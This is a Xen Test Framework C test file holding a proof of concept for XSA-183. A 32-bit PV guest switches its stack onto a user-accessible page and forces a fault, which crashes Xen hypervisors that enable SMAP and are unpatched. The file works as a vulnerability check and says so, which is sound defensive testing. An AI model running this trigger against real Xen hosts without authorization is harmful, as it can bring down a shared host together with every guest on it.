/**
 * @file tests/xsa-183/main.c
 * @ref test-xsa-183
 *
 * @page test-xsa-183 XSA-183
 *
 * Advisory: [XSA-183](http://xenbits.xen.org/xsa/advisory-183.html)
 *
 * This vulnerability only affects hardware supporting SMAP (Intel
 * Broadwell/AMD Zen or later) on Xen 4.5 or later (due to the addition of
 * software support to enable and use SMAP).
 *
 * Supervisor Mode Access Prevention is a hardware feature whereby an
 * Operating System can opt-in to more strict pagetable requirements, designed
 * to make it more robust, by raising a pagefault rather than accidentally
 * following a pointer into userspace.  However, legitimate accesses into
 * userspace require whitelisting.
 *
 * In Xen, compat_create_bounce_frame() is the function with the purpose of
 * creating an exception/interrupt frame on a guest stack (matching what
 * hardware would normally do).
 *
 * 32bit PV guest kernels, running in ring1, normally run on supervisor
 * mappings.  However, the guest kernel is in control of its own stack
 * pointer, so nothing stops the kernel putting @%esp over a user mapping.
 *
 * Under those circumstances if compat_create_bounce_frame() is invoked, it
 * will (legitimately) try to create an exception frame on the kernel stack.
 * If SMAP is enabled and the accesses are not whitelisted, Xen takes a fatal
 * pagefault and crashes.
 *
 * If vulnerable, Xen will crash citing a fatal SMAP fault in
 * compat_create_bounce_frame().  If not vulnerable, the test will exit
 * cleanly.
 *
 * @see tests/xsa-183/main.c
 */
#include <xtf.h>

#include <arch/x86/pagetable.h>
#include <arch/x86/symbolic-const.h>

uint8_t user_stack[PAGE_SIZE] __aligned(PAGE_SIZE);

void test_main(void)
{
    unsigned long curr_stk, discard;
    intpte_t nl1e = pte_from_virt(user_stack, PF_SYM(AD, U, RW, P));

    printk("XSA-183 PoC\n");

    /* Remap user_stack with _PAGE_USER. */
    if ( hypercall_update_va_mapping(user_stack, nl1e, UVMF_INVLPG) )
        panic("Unable to remap user_stack with _PAGE_USER\n");

    /* Load NULL selector to guarantee a fault. */
    write_fs(0);

    asm volatile ("pushf;"                    /* Set AC to whitelist user */
                  "orl $%c[AC], (%%esp);"     /* accesses.  Avoids crashes if */
                  "popf;"                     /* Xen leaks SMAP into guest. */
                                              /* context. */

                  "mov %%esp, %[curr_stk];"   /* Record the current stack. */
                  "mov %[user_stk], %%esp;"   /* Switch to the user stack. */

                  "1: mov %%fs:0, %[tmp]; 2:" /* Read from NULL using a NULL */
                  _ASM_EXTABLE(1b, 2b)        /* selector to cause a fault. */

                  "mov %[curr_stk], %%esp;"   /* Restore the previous stack. */
                  : [curr_stk] "=&q" (curr_stk),
                    [tmp] "=r" (discard)
                  : [user_stk] "q" (&user_stack[PAGE_SIZE]),
                    [AC] "i" (X86_EFLAGS_AC));

    /*
     * If Xen hasn't crashed by this point, we are either running on hardware
     * without SMAP, or with SMAP disabled, or Xen has been patched.  Either
     * way, Xen isn't vulnerable to XSA-183 in its current configuration.
     */
    xtf_success("Xen is not vulnerable to XSA-183\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
